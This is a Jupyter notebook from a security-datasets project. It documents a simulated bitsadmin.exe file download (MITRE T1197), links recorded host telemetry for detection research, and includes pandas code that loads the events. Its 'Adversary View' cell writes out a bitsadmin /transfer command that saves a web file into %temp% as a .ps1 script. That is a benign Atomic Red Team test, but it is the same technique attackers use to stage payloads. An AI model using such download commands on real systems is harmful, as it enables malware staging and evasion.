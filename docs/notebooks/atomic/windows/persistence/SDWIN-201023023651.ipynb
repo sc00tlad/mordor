{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d25d878a",
   "metadata": {},
   "source": [
    "# Bitsadmin Download Malicious File"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a7f4eeb5",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "54b7cd15",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/23 |\n",
    "| Modification Date | 2020/10/23 |\n",
    "| Tactics           | [TA0003](https://attack.mitre.org/tactics/TA0003),[TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1197](https://attack.mitre.org/techniques/T1197) |\n",
    "| Tags              | art.3c73d728-75fb-4180-a12f-6712864d7421 |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f55a1366",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents threat actors leveraging bitsadmin.exe to download a file."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bc48f50e",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7c50d194",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_bitsadmin_download_psh_script.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_bitsadmin_download_psh_script.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3988d9cf",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d299bdd3",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8e617cb6",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | Cmd | [Cmd](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md#atomic-test-1---bitsadmin-download-cmd) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a31d73ac",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin1_flag.ps1\n",
    "\n",
    "DISPLAY: '/Download' TYPE: DOWNLOAD STATE: TRANSFERRED\n",
    "PRIORITY: FOREGROUND FILES: 1 / 1 BYTES: 6886 / 6886 (100%)\n",
    "Transfer complete.\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cd276291",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d1dc631b",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f1114cac",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/cmd_bitsadmin_download_psh_script.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "44961811",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c8c6acad",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e46756df",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ad60f2bb",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bacdd070",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md#atomic-test-1---bitsadmin-download-cmd](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md#atomic-test-1---bitsadmin-download-cmd) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
